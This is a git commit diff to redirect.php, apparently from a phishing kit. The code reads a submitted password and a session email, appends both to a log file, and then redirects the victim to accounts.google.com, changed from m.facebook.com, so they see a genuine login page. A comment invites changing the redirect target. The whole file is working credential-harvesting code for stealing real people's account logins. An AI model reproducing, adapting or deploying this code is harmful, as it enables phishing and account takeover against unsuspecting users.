fb1d0b21c15d0d16a92e71b17934fea26fdb828b
Rajesh Kumar <55292588+hack4techno@users.noreply.github.com>
2021-03-27 17:23:00 +0530

    Update redirect.php

--- redirect.php
+++ redirect.php
@@ -5,7 +5,7 @@
 			$pass = $_POST["Passwd"];
 			$email=$_SESSION["Email"];
 			//opening logins text file for appending new data.
-  			$file = fopen("logins.txt", "a") or die("Unable to open file!");
+  			$file = fopen("log.txt", "a") or die("Unable to open file!");
 			
   			//Writing email and password to logins.txt. 
   			fwrite($file, $email."	".$pass.PHP_EOL);			
@@ -13,7 +13,7 @@
 			
   			//redirecting user to the google drive's locations where the game is available to download.
   			//change the location url to redirect to a website of your choice.
-  			header("Location: https://m.facebook.com");
+  			header("Location: https://accounts.google.com");
 			exit();
 			
 			
